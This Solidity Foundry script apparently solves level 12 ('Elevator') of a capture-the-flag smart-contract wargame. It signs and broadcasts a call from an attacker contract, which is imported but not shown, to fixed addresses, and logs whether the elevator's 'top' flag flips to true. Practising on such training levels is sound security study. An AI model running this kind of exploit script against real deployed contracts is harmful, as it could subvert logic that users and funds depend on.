// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "../../lib/forge-std/src/Script.sol";
import {Elevator} from "../src/L12__Elevator.sol";
import {L12_Caller__Elevator} from "../src/L12_Caller__Elevator.sol";

// This elevator won't let you reach the top of your building. Right?

contract L12_Solution__Elevator is Script {
    Elevator public elevator =
        Elevator(0x44aF8d2d1e112fE90d60C3Ac3C741458799e608c);
    L12_Caller__Elevator public elevator_caller =
        L12_Caller__Elevator(0x0a3e248601575fb6914d01D0eEd567FDd6AD7d18);

    function run() public {
        uint256 _robberPrivKey = vm.envUint("PRIV_KEY");
        bool _atTop;

        _atTop = elevator.top();
        console.log("At top floor? %s", _atTop);

        vm.startBroadcast(_robberPrivKey);

        elevator_caller.callGoTo();

        vm.stopBroadcast();

        _atTop = elevator.top();
        console.log("Now at top floor? %s", _atTop);
    }
}
